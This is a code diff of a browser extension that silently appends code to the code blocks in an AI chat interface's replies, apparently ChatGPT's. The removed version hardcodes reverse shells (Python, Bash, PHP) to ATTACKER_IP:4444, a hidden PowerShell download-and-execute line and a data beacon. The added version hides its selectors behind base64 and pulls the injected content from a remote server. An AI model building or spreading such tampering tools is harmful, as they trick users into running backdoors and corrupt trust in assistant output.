@@ -1,88 +1,138 @@
-// Payloads based on detected programming language
-const PAYLOADS = {
-  python: `
-# Reverse Shell (Security Research POC)
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("ATTACKER_IP",4444))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-subprocess.call(["/bin/sh"])`,
-  javascript: `
-// Beacon to attacker server (Security Research POC)
-fetch("http://ATTACKER_IP/beacon?user=" + encodeURIComponent(navigator.userAgent));`,
-  bash: `
-# Bash Reverse Shell (Security Research POC)
-bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`,
-  powershell: `
-# PowerShell Reverse Shell (Security Research POC)
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"`,
-  php: `
-<?php
-// PHP Reverse Shell (Security Research POC)
-exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
-?>`,
-  default: `
-// Modified by plugin (Security Research POC)
-`
+// Content Modifier Extension (Demo)
+console.log('[+] ' + atob('UmVzZWFyY2ggRGVtbzogQ29udHJvbGxlZCB0ZXN0IGVudmlyb25tZW50IG9ubHku'));
+
+// API endpoint for fetching data (placeholder for local server)
+const API_URL = 'https://<FLASK_SERVER>:<PORT>/' + atob('ZGF0YQ=='); // "/data"
+
+// Cache for fetched data
+const dataCache = new Map();
+
+// Default payloads for fallback
+const FALLBACK_CONTENT = {
+  python: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\nprint("Simulated fallback Python content")',
+  javascript: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\nconsole.log("Simulated fallback JavaScript content")',
+  bash: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\necho "Simulated fallback Bash content"',
+  powershell: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\nWrite-Output "Simulated fallback PowerShell content"',
+  php: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\necho "Simulated fallback PHP content"',
+  default: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\necho "Simulated fallback default content"'
 };
 
-// Function to modify code blocks based on language
-function modifyCodeBlocks(codeEls, source = 'unknown') {
-  codeEls.forEach(codeEl => {
-    try {
-      const languageDiv = codeEl.closest('div.contain-inline-size')?.querySelector('div.text-xs.font-sans');
-      const language = languageDiv?.innerText?.toLowerCase().trim() || 'unknown';
-      const payload = PAYLOADS[language] || PAYLOADS.default;
+// Utility to decode and execute DOM operations
+const x = (el, prop, val) => {
+  const p = atob(prop);
+  if (val !== undefined) el[p] += `\n${val}`;
+  return el[p];
+};
 
-      // Avoid duplicate injection and ensure text content exists
-      if (codeEl.innerText && !codeEl.innerText.includes("ATTACKER_IP") && typeof codeEl.innerText === 'string') {
-        codeEl.innerText += `\n${payload}`;
-        console.log(`[+] Injected ${language} payload (Source: ${source})`);
-      } else {
-        console.log(`[-] Skipped injection for ${language} (already modified or no text)`);
-      }
+// Pre-fetch known data types
+const KNOWN_TYPES = ['python', 'javascript', 'bash', 'powershell', 'php', 'default'];
+async function preloadData(retryCount = 0) {
+  console.log('[+] Preloading data for known types');
+  for (const type of KNOWN_TYPES) {
+    if (dataCache.has(type)) continue;
+    try {
+      const response = await fetch(`${API_URL}?${atob('dHlwZQ==')}=${encodeURIComponent(type)}`, {
+        method: 'GET',
+        headers: { 'Content-Type': 'application/json' }
+      });
+      if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+      const data = await response.json();
+      dataCache.set(type, data[atob('Y29udGVudA==')] || FALLBACK_CONTENT[type]);
+      console.log(`[+] Preloaded data for ${type}`);
     } catch (error) {
-      console.error(`[-] Error modifying code block: ${error.message}`);
+      console.error(`[-] Error preloading data for ${type}: ${error.message}`);
+      dataCache.set(type, FALLBACK_CONTENT[type]);
+      if (retryCount < 2) {
+        console.log(`[+] Retrying preload for ${type} (${retryCount + 1}/2)`);
+        setTimeout(() => preloadData(retryCount + 1), 1000);
+      }
     }
-  });
+  }
 }
 
-// Observe DOM changes for new messages
+// Function to get cached data
+function getData(type) {
+  return dataCache.get(type) || FALLBACK_CONTENT[type] || '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)';
+}
+
+// Function to update code blocks
+function updateBlocks(els, source = 'unknown') {
+  if (!els.length) {
+    console.log(`[-] No blocks found (Source: ${source})`);
+    return;
+  }
+  console.log(`[+] Found ${els.length} blocks (Source: ${source})`);
+  for (const el of els) {
+    try {
+      const parent = el.closest(atob('cHJl')) || el.closest(atob('ZGl2LmNvbnRhaW4taW5saW5lLXNpemU=')); // "pre" or "div.contain-inline-size"
+      const typeDiv = parent?.querySelector(atob('ZGl2W2NsYXNzKj0ibGFuZ3VhZ2UtIl0sIHNwYW5bY2xhc3MqPSJsYW5ndWFnZS0iXSwgZGl2W2NsYXNzKj0idGV4dC0iXSwgc3BhbltjbGFzcyo9InRleHQtIl0sIGRpdltjbGFzcyo9InRleHQtcnMtZm9udC1zYW5zIl0=')) ||
+                      parent?.parentElement?.querySelector(atob('ZGl2W2NsYXNzKj0ibGFuZ3VhZ2UtIl0sIHNwYW5bY2xhc3MqPSJsYW5ndWFnZS0iXQ=='));
+      let type = typeDiv?.[atob('aW5uZXJUZXh0')]?.toLowerCase().trim() || 'unknown';
+      
+      if (type === 'Python') type = 'python';
+      if (type === 'JavaScript') type = 'javascript';
+      if (type === 'Bash') type = 'bash';
+      if (type === 'PowerShell') type = 'powershell';
+      if (type === 'PHP') type = 'php';
+      
+      console.log(`[+] Detected type: ${type}, TypeDiv:`, typeDiv, `Text:`, typeDiv?.[atob('aW5uZXJUZXh0')]);
+
+      if (type === 'unknown') {
+        console.log(`[-] Skipping update for unknown type (Source: ${source})`);
+        continue;
+      }
+
+      const content = getData(type);
+      
+      if (x(el, 'aW5uZXJUZXh0') && !x(el, 'aW5uZXJUZXh0').includes(atob('UmVzZWFyY2ggRGVtbw==')) && typeof x(el, 'aW5uZXJUZXh0') === 'string') {
+        x(el, 'aW5uZXJUZXh0', content);
+        console.log(`[+] Updated ${type} block (Source: ${source})`);
+      } else {
+        console.log(`[-] Skipped update for ${type} (already updated or no text)`);
+      }
+    } catch (error) {
+      console.error(`[-] Error updating block: ${error.message}`);
+    }
+  }
+}
+
+// Observe DOM changes
 const observer = new MutationObserver(mutations => {
   mutations.forEach(m => {
     m.addedNodes.forEach(node => {
       if (node.nodeType === 1) {
-        const codeEls = node.querySelectorAll('div.contain-inline-size div.overflow-y-auto code');
-        modifyCodeBlocks(codeEls, 'MutationObserver');
+        const els = node.querySelectorAll(atob('cHJlIGNvZGUsIGRpdltjbGFzcyo9ImNvZGUiXSBjb2RlLCBkaXZbY2xhc3MqPSJjb250YWluLWlubGluZS1zaXplIl0gZGl2W2NsYXNzKj0ib3ZlcmZsb3cteS1hdXRvIl0gY29kZQ=='));
+        updateBlocks(els, 'MutationObserver');
       }
     });
   });
 });
 
-// Start observing ChatGPT's main content area and check existing content
+// Start observing and preload data
 window.addEventListener('load', () => {
-  console.log('[+] GPT Response Modifier extension loaded (Security Research POC)');
-  const main = document.querySelector('main');
+  console.log('[+] Content Modifier Extension loaded (' + atob('UmVzZWFyY2ggRGVtbw==') + ')');
+  // Start observing immediately
+  const main = document.querySelector(atob('bWFpbg=='));
   if (main) {
-    observer.observe(main, { childList: true, subtree: true });
-    const codeEls = document.querySelectorAll('div.contain-inline-size div.overflow-y-auto code');
-    modifyCodeBlocks(codeEls, 'Initial Load');
+    observer.observe(main, { childList: true, subtree: true, characterData: true }); // Added characterData for streaming
+    const els = document.querySelectorAll(atob('cHJlIGNvZGUsIGRpdltjbGFzcyo9ImNvZGUiXSBjb2RlLCBkaXZbY2xhc3MqPSJjb250YWluLWlubGluZS1zaXplIl0gZGl2W2NsYXNzKj0ib3ZlcmZsb3cteS1hdXRvIl0gY29kZQ=='));
+    updateBlocks(els, 'Initial Load');
   } else {
     console.warn('[-] Main element not found');
   }
-
-  // Fallback: Periodically check for new code blocks
-  let modificationCount = 0;
-  const maxModifications = 50; // Limit for safety
+  // Preload data asynchronously
+  preloadData();
+  // Fallback: Periodically check for new blocks and retry preload
+  let updateCount = 0;
+  const maxUpdates = 50;
   const interval = setInterval(() => {
-    const codeEls = document.querySelectorAll('div.contain-inline-size div.overflow-y-auto code');
-    modifyCodeBlocks(codeEls, 'Interval Check');
-    modificationCount += codeEls.length;
-    if (modificationCount >= maxModifications) {
-      console.log('[+] Stopping interval after reaching modification limit');
+    if (dataCache.size < KNOWN_TYPES.length) preloadData();
+    const els = document.querySelectorAll(atob('cHJlIGNvZGUsIGRpdltjbGFzcyo9ImNvZGUiXSBjb2RlLCBkaXZbY2xhc3MqPSJjb250YWluLWlubGluZS1zaXplIl0gZGl2W2NsYXNzKj0ib3ZlcmZsb3cteS1hdXRvIl0gY29kZQ=='));
+    updateBlocks(els, 'Interval Check');
+    updateCount += els.length;
+    if (updateCount >= maxUpdates) {
+      console.log('[+] Stopping interval after reaching update limit');
       clearInterval(interval);
     }
-  }, 1000);
+  }, 250); // Faster interval for streaming
 });
